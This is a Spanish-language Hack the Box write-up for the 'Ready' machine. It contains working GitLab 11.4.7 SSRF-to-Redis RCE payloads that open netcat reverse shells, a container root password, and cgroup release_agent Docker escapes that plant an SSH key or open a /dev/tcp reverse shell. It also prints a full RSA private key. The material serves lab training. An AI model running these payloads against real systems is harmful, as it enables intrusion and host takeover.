---
description: >-
  G4l1l30 write-up on the medium-difficulty Linux machine Ready from
  https://hackthebox.eu
title: Hack the Box - Ready Writeup
date: 2021-05-15 12:00:00 -0600
categories: [Hack the Box, Writeup]
tags: [htb, hacking, hack the box, redteam, Linux, medium, writeup, gitlab RCE, gitlab 11.4.7, docker privileged]     # TAG names should always be lowercase
show_image_post: true
image: /assets/img/Ready/InfoCard.png
---

# Summary

![](/assets/img/Ready/InfoCard.png)

Ready es una VM Medium de la plataforma HackTheBox recientemente retirada(aquí fecha), para realizar esta Box, necesitaremos explotar un RCE en GitLab 11.4.7, aprovechar el flag **privileged** en Docker para escapar del mismo.

## Info de la maquina



| VM column  | Detalles     |
| ---------- | ------------ |
| Nombre     | Ready        |
| Dificultad | Medium       |
| Release    | 12/12/2020   |
| OS         | Linux        |
| IP         | 10.10.10.220 |

Editamos ***/etc/hosts***  y agregamos la IP **10.10.10.220** que apunte hacia **ready.htb** 

# Escaneo de Puertos

Escaneamos los puertos con Masscan y Nmap, utilizando **Masscan_To_Nmap** , esta herramienta escanea puertos TCP y UDP, toma los abiertos y ejecuta Nmap en búsqueda de servicios y scripts por default, mas info y donde conseguir el script: 

* > [https://github.com/Purp1eW0lf/Masscan_to_Nmap](masscan_to_nmap.py)

Nota: Pueden crear un alias del script, asi se evitan ir a un "x" directorio o utilizar un path ;) 

Utilizamos el script en python y obtenemos lo siguiente: 

Puertos encontrados con Masscan y escaneados con Nmap:

![](/assets/img/Ready/masscan_01.png)

```bash
PORT     STATE SERVICE VERSION                                                                                                                                                             
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)                                                                                                                 
| ssh-hostkey:                                                                                                                                                                             
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)                                                                                                                             
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)                                                                                                                            
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)                                                                                                                          
5080/tcp open  http    nginx                                                                                                                                                               
| http-robots.txt: 53 disallowed entries (15 shown)                                                                                                                                        
| / /autocomplete/users /search /api /admin /profile                                                                                                                                       
| /dashboard /projects/new /groups/new /groups/*/edit /users /help                                                                                                                         
|_/s/ /snippets/new /snippets/*/edit                                                                                                                                                       
| http-title: Sign in \xC2\xB7 GitLab                                                                                                                                                      
|_Requested resource was http://ready.htb:5080/users/sign_in                                                                                                                               
|_http-trane-info: Problem with XML parsing of /evox/about                                                                                                                                 
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port                                                                                      
Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 2.6.32 (94%), Linux 5.0
 - 5.3 (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)
No exact OS matches for host (test conditions non-ideal).                                                                                                                                  
Network Distance: 2 hops                                                                                                                                                                   
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel                     
```

Dos puertos : **22 ssh** y **5080 http** 

En el puerto 22 no hay mucho que hacer,  así que vamos por el puerto 5080, el cual es un portal de **Gitlab** 



# Enum Portal de GitLab

![](/assets/img/Ready/git_lab01.png)



Procedemos a registrarnos y vamos al apartado de **help** y encontramos la versión de GitLab : 11.4.7 

![](/assets/img/Ready/git_lab02.png)

Una breve búsqueda con **searchsploit**  y obtenemos lo siguiente:

![](/assets/img/Ready/git_lab03.png)

Honestamente, no me funcionaron ninguno de los dos, pero me da una cierta idea, tambien esta como referencia los siguientes CVE:

1. CVE-2018-19571 (SSRF) 
2. CVE-2018-19585 (CRLF)
3. CVE-2020-10977

 Hay tres(3)  formas que conozco de conseguir el foothold en el que es casi lo mismo, empiezo con el que utilice la primera vez:

## Foothold  #1

Una simple busqueda en Google y obtenemos el siguiente resource  junto a un video explicativo:

> * [https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/](https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/)
> * [https://www.youtube.com/watch?v=LrLJuyAdoAg](https://www.youtube.com/watch?v=LrLJuyAdoAg)
> * [https://hackerone.com/reports/299473](https://www.youtube.com/watch?v=LrLJuyAdoAg)

Creamos un nuevo proyecto:

![](/assets/img/Ready/foothold_step1.png)

Ahora le damos **Import Project** y luego a **repo-by-url** : 



![](/assets/img/Ready/foothold_step2.png)

Ahí agregamos el payload(Según podemos leer en el resource, la idea es comunicarse con el servidor Redis y ahi es cuando entra el SSRF), este es el payload:

```bash
git://[0:0:0:0:0:ffff:127.0.0.1]:6379/
 multi
 sadd resque:gitlab:queues system_hook_push
 lpush resque:gitlab:queue:system_hook_push "{\"class\":\"GitlabShellWorker\",\"args\":[\"class_eval\",\"open(\'|cat /flag | nc 10.10.14.** 9001 -e /bin/bash \').read\"],\"retry\":3,\"queue\":\"system_hook_push\",\"jid\":\"ad52abc5641173e217eb2e52\",\"created_at\":1513714403.8122594,\"enqueued_at\":1513714403.8129568}"
 exec
 exec
/ssrf.git
```

El payload debe estar ***Encoded*** , este caso queda asi :

```bash
git://[0:0:0:0:0:ffff:127.0.0.1]:6379/%0A%20multi%0A%20sadd%20resque:gitlab:queues%20system_hook_push%0A%20lpush%20resque:gitlab:queue:system_hook_push%20%22%7B%5C%22class%5C%22:%5C%22GitlabShellWorker%5C%22,%5C%22args%5C%22:%5B%5C%22class_eval%5C%22,%5C%22open(%5C'%7Ccat%20/flag%20%7C%20nc%2010.10.14.16%204444%20-e%20/bin/bash%20%5C').read%5C%22%5D,%5C%22retry%5C%22:3,%5C%22queue%5C%22:%5C%22system_hook_push%5C%22,%5C%22jid%5C%22:%5C%22ad52abc5641173e217eb2e52%5C%22,%5C%22created_at%5C%22:1513714403.8122594,%5C%22enqueued_at%5C%22:1513714403.8129568%7D%22%0A%20exec%0A%20exec%0A/ssrf.git
```

* > [CyberChef referencia URL Encoded](https://gchq.github.io/CyberChef/#recipe=URL_Encode(false)&input=CiBtdWx0aQogc2FkZCByZXNxdWU6Z2l0bGFiOnF1ZXVlcyBzeXN0ZW1faG9va19wdXNoCiBscHVzaCByZXNxdWU6Z2l0bGFiOnF1ZXVlOnN5c3RlbV9ob29rX3B1c2ggIntcImNsYXNzXCI6XCJHaXRsYWJTaGVsbFdvcmtlclwiLFwiYXJnc1wiOltcImNsYXNzX2V2YWxcIixcIm9wZW4oXCd8Y2F0IC9mbGFnIHwgbmMgMTAuMTAuMTQuMjMgNDQ0NCAtZSAvYmluL2Jhc2ggXCcpLnJlYWRcIl0sXCJyZXRyeVwiOjMsXCJxdWV1ZVwiOlwic3lzdGVtX2hvb2tfcHVzaFwiLFwiamlkXCI6XCJhZDUyYWJjNTY0MTE3M2UyMTdlYjJlNTJcIixcImNyZWF0ZWRfYXRcIjoxNTEzNzE0NDAzLjgxMjI1OTQsXCJlbnF1ZXVlZF9hdFwiOjE1MTM3MTQ0MDMuODEyOTU2OH0iCiBleGVjCiBleGVjCi9zc3JmLmdpdA)

El payload deberia agregarse en **Git Repository URL** :

![](/assets/img/Ready/foothold_step3.png)

Antes de enviarlo, ponemos a la escucha netcat (mi puerto es el 4444[classic])

![](/assets/img/Ready/foothold_step4.png)

## Foothold #2

Ahora obtendremos nuestros foothold con los mismos pasos a excepción que vamos a importar solo esta parte:

`git://[0:0:0:0:0:ffff:127.0.0.1]:6379/test/ssrf.git`

Luego con BurpSuite vamos a modificar el request con lo siguiente:

```bash
 multi

 sadd resque:gitlab:queues system_hook_push

 lpush resque:gitlab:queue:system_hook_push "{\"class\":\"GitlabShellWorker\",\"args\":[\"class_eval\",\"open(\'|nc -e /bin/bash 10.10.xx.xx PORT\').read\"],\"retry\":3,\"queue\":\"system_hook_push\",\"jid\":\"ad52abc5641173e217eb2e52\",\"created_at\":1513714403.8122594,\"enqueued_at\":1513714403.8129568}"

 exec

 exec

/ssrf.git
```

Obtenemos el request con Burp y lo mandamos al repeater:

![](/assets/img/Ready/burp_01.png)



Nota: El **/test/ssrf.git** no es "necesario" , lo removemos y agregamos nuestro payload. 

Nota 2: En principio, se debería enviar sin lo antes descrito pero a mi no me dejaba :) 

Quedaría así:

![](/assets/img/Ready/burp_02.png)

Y...

![](/assets/img/Ready/burp_03.png)



Tenemos nuestro foothold :) 



## Foothold #3

Se trata de un script de uno de los usuarios de HackTheBox, encontramos el script aqui:

* > [https://github.com/dotPY-hax/gitlab_RCE/blob/main/gitlab_rce.py](https://github.com/dotPY-hax/gitlab_RCE/blob/main/gitlab_rce.py)



![](/assets/img/Ready/git_lab04.png)



Ahora ejecutamos el script tal cual se nos indica:

![](/assets/img/Ready/git_lab05.png)

Ahora tenemos el `user.txt` que estaba en el **home** de **dude** :)  


# Docker

Toca enumerar ;D, en busqueda de algun file **suid** con : `find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;` pero no da resultados. Intento con los `capabilities` pero absolutamente nada, estoy en "Ubuntu 16.04 [ Xenial]" . Tiro por los archivos con permiso de escritura con `find / -perm -2 -type f 2>/dev/null` y aun que no encuentro nada interesante, tengo una idea de donde estoy : Matrix?.

Por otra parte, no hay nada interesante en /home/dude, ni en el crontab/cronjob, dado a la cantidad de archivos que puedo acceder en **/proc** , espesificamente a **cgroup** (una ligera sensacion de la virtualizacion de una "x" cantidad de procesos virtualizados, so, cada proceso tiene una entrada en ese pseudo filesystem), este ultimo se una caracteristica para limitar/gestionar recursos,una pratica comun en docker-container, si estuvieramos fuera de un contenedor, el orden jerarquico empezaria con **/** , pero dicho anteriormente, desde que Docker o Linux Container(LXC) usa  **cgroup* , podemos echar una ojeada a esto:



![](/assets/img/Ready/docker.png) 

Bingo :) estamos en un contenedor.

Nota: El **1** es el PID (Pueden googlear :) )

Otra forma de averiguar si estamos en la Matrix , docker crea un file llamado **dockerenv** en **/** , es decir : **/.dockerenv** 

![](/assets/img/Ready/docker_02.png)



Bueno, si queremos divertirno un poco mas, un script en bash : 

```bash
#!/bin/bash
if  [ -f /.dockerenv ]; then
    echo "Estas en la Matrix ;(, toma la pildora azul Neo";
else
    echo "Uy, solo puedes tomar una pildora roja";
fi
```

![](/assets/img/Ready\docker_03.png)



Lel ;)

# Root container

Buscando en entre los directorios de la raiz ***/*** , se puede encontrar algo interesante en **/opt/backup**  :

![](/assets/img/Ready/escape_01.png)

Actualmente estamos en un container del cual no somos root del mismo, ademas encontramos un backup, tentamos a la suerte con **cat * | grep -i password** 

![](/assets/img/Ready/escape_02.png)



Tenemos el siguiente password **wW59U!ZKMbG9+*#h** , el cual vamos a intentar switchearnos hacia **root** 

![](/assets/img/Ready/escape_03.png)

**Somos root....del container :D** 

#  Privsec

Despues de buscar y buscar, encontre una forma de escapar del contenedor, sin embargo hay mas de una sola forma de hacerlo:

## Privsec #1

Este articulo de **Vickie Li** (she is bae xd):

* > [Escaping Docker Privileged Containers](Escaping Docker Privileged Containers)

So, basicamente si estamos en un container y el mismo esta privilegiado con la flag "privileged", en el articulo Vickie Li nos pone un ejemplo el cual no funciona en nuestro contenedor pero hey, **capsh --print** no nos funcionaba en el foothold, ahora si :) , y vemos el capabilitie que hace referencia la autora. 



![](/assets/img/Ready/privsec_01.png)

So, la idea es tomar este PoC (la autora hace referencia que tomo el PoC desde aca : https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/  , sirve de lectura ) : 

```bash
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/xecho 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agentecho '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmdsh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

La idea es generar una llave ssh con **ssh-keygen** 

![](/assets/img/Ready/privsec_02.png)

Ahora pasamos el contenido de **id_rsa.pub** y lo metemos en el PoC en un archivo **.sh** en mi caso seria **gali.sh** cuyo contenido es: 

```bash
mkdir /tmp/gali && mount -t cgroup -o rdma cgroup /tmp/gali && mkdir /tmp/gali/ops
echo 1 > /tmp/luci12/xx/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/gali/release_agent

echo '#!/bin/sh' > /cmd
echo "echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDksYDqxt5SnrafpvN8IeJzJc6Nn0HMNLJUa+Bc1oatokzuQZBbXtQz8TmAd+jCInAfVuADlleIAaxYvwNNefwo2v82gybIL0l8fBP/Mk8j4p52qiQo2RTDjJvdKjLs4V/6e8dvKSQbjevliAv+Ji6yoCCbUtnBODHTm7HDixD+Ia+WmSqj8mYXDEQvGtgjid5CHatxA84HnYQ1GTh53FO0MCVyTdqAELmz9XOzJMRQIPJ7y3yA2CM3GKhNbyW2+Db62FCsuyGu86C6pSR/LOi6Gu09zWrRIiQ78+VEwqJufaMBeDrHL0X5eo7t78tKlBOPoQKM1GTopX4xTMqkb1VrsBCaN9ppbBJaGsCKl4+EJE9Ij2ISnDLmwYNpCh3ebKnGwPEd/GhQcXT0UOcrEO9NbSuBrJs5Wg4nwlwXfjKvxj45YfwxKa8Tibgrz1Tb/oUUSoIrjv59qyR2uVNqHKbSySi4QgmhUJkzLs5HpPWP/7xhQwvqlhv7MV7gXa97Rbk= g4l1l30@parrot' > /root/.ssh/authorized_keys" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/gali/ops/cgroup.procs"
```

Dejamos nuestro servidor web activo:

![](/assets/img/Ready/privsec_03.png)

Y descargamos nuestro archivo en **/tmp** , le damos permiso con **chmod +x** y ejecutamos:

![](/assets/img/Ready/privsec_04.png)

Ahora le damos permiso a nuestro id_rsa con **chmod  600**  y con **ssh -i id_rsa root@ready.htb ** nos metemos a la maquina victima :) 

**Nota**: El parametro **-i** sirve para cargar un archivo de identidad 

![](/assets/img/Ready/privsec_05.png)

Y...

![](/assets/img/Ready/privsec_06.png)

Listo :)

## Privsec #2



La idea del otro Privsec es sacada directamente desde aca 

* >  [https://kinvolk.io/blog/2018/04/towards-unprivileged-container-builds/](https://kinvolk.io/blog/2018/04/towards-unprivileged-container-builds/)

Praticamente es  trata varios aspectos de un contenedor sin "privilegios" pero creado con un usuario root: user namespaces, mounts, y algunos filesystems, de lejos este es el modo mas interesante y del cual tengo pendiente empaparme mas, siguiendo el how to , haremos un nuevo montaje en el container.

![](/assets/img/Ready/privsec02_01.png)

Nota: Esto funciona por un periodo de tiempo muy corto. asi que la idea es sacar la el contenido del **id_rsa** 

![](/assets/img/Ready/privsec02_02.png)



```bash
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAvyovfg++zswQT0s4YuKtqxOO6EhG38TR2eUaInSfI1rjH09Q
sle1ivGnwAUrroNAK48LE70Io13DIfE9rxcotDviAIhbBOaqMLbLnfnnCNLApjCn
6KkYjWv+9kj9shzPaN1tNQLc2Rg39pn1mteyvUi2pBfA4ItE05F58WpCgh9KNMlf
YmlPwjeRaqARlkkCgFcHFGyVxd6Rh4ZHNFjABd8JIl+Yaq/pg7t4qPhsiFsMwntX
TBKGe8T4lzyboBNHOh5yUAI3a3Dx3MdoY+qXS/qatKS2Qgh0Ram2LLFxib9hR49W
rG87jLNt/6s06z+Mwf7d/oN8SmCiJx3xHgFzbwIDAQABAoIBACeFZC4uuSbtv011
YqHm9TqSH5BcKPLoMO5YVA/dhmz7xErbzfYg9fJUxXaIWyCIGAMpXoPlJ90GbGof
Ar6pDgw8+RtdFVwtB/BsSipN2PrU/2kcVApgsyfBtQNb0b85/5NRe9tizR/Axwkf
iUxK3bQOTVwdYQ3LHR6US96iNj/KNru1E8WXcsii5F7JiNG8CNgQx3dzve3Jzw5+
lg5bKkywJcG1r4CU/XV7CJH2SEUTmtoEp5LpiA2Bmx9A2ep4AwNr7bd2sBr6x4ab
VYYvjQlf79/ANRXUUxMTJ6w4ov572Sp41gA9bmwI/Er2uLTVQ4OEbpLoXDUDC1Cu
K4ku7QECgYEA5G3RqH9ptsouNmg2H5xGZbG5oSpyYhFVsDad2E4y1BIZSxMayMXL
g7vSV+D/almaACHJgSIrBjY8ZhGMd+kbloPJLRKA9ob8rfxzUvPEWAW81vNqBBi2
3hO044mOPeiqsHM/+RQOW240EszoYKXKqOxzq/SK4bpRtjHsidSJo4ECgYEA1jzy
n20X43ybDMrxFdVDbaA8eo+og6zUqx8IlL7czpMBfzg5NLlYcjRa6Li6Sy8KNbE8
kRznKWApgLnzTkvupk/oYSijSliLHifiVkrtEY0nAtlbGlgmbwnW15lwV+d3Ixi1
KNwMyG+HHZqChNkFtXiyoFaDdNeuoTeAyyfwzu8CgYAo4L40ORjh7Sx38A4/eeff
Kv7dKItvoUqETkHRA6105ghAtxqD82GIIYRy1YDft0kn3OQCh+rLIcmNOna4vq6B
MPQ/bKBHfcCaIiNBJP5uAhjZHpZKRWH0O/KTBXq++XQSP42jNUOceQw4kRLEuOab
dDT/ALQZ0Q3uXODHiZFYAQKBgBBPEXU7e88QhEkkBdhQpNJqmVAHMZ/cf1ALi76v
DOYY4MtLf2dZGLeQ7r66mUvx58gQlvjBB4Pp0x7+iNwUAbXdbWZADrYxKV4BUUSa
bZOheC/KVhoaTcq0KAu/nYLDlxkv31Kd9ccoXlPNmFP+pWWcK5TzIQy7Aos5S2+r
ubQ3AoGBAIvvz5yYJBFJshQbVNY4vp55uzRbKZmlJDvy79MaRHdz+eHry97WhPOv
aKvV8jR1G+70v4GVye79Kk7TL5uWFDFWzVPwVID9QCYJjuDlLBaFDnUOYFZW52gz
vJzok/kcmwcBlGfmRKxlS0O6n9dAiOLY46YdjyS8F8hNPOKX6rCd
-----END RSA PRIVATE KEY-----

```

Guardamos el contenido  y nos logueamos tal cual como en el **Privsec #1**

## Privsec #3

Directo desde aqui 

[https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout#i-own-root](https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout#i-own-root)

Literalmente son movimientos  si soy root en docker, tomamos el segundo PoC

```bash
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent

echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/10.10.14.16/4444 0>&1" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```





![](/assets/img/Ready/priv03.png)



Podemos pegar tanto el PoC paso a paso como todo un conjunto.

![](C:\Users\robencarnacion\Desktop\Totally not a virus trust me ... i'm a dolphin\Ready\root.png)

E_O_F :)

![](/assets/img/Ready/gali.png)
